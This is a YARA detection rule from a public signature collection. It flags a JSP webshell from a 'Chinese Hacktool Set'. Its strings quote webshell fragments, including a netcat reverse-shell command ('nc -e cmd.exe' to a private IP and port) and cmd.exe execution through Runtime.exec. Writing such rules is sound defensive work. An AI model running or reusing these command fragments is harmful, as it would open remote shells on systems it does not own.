rule SIGNATURE_BASE_Txt_Jsp : FILE
{
	meta:
		description = "Chinese Hacktool Set - Webshells - file jsp.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "53eb6caf-3578-5df7-a1d8-9e4038b6f57e"
		date = "2015-06-14"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/995df52f47284d130b8cbf57d08c31e927e44c09/yara/gen_cn_webshells.yar#L610-L626"
		license_url = "https://github.com/Neo23x0/signature-base/blob/995df52f47284d130b8cbf57d08c31e927e44c09/LICENSE"
		hash = "74518faf08637c53095697071db09d34dbe8d676"
		logic_hash = "039b145031cf1127cb1b2aeda063d578d9eb151559232d7e6049965111df1e28"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
		$s2 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
		$s3 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
		$s4 = "cmd = \"cmd.exe /c set\";" fullword ascii

	condition:
		filesize <715KB and 2 of them
}
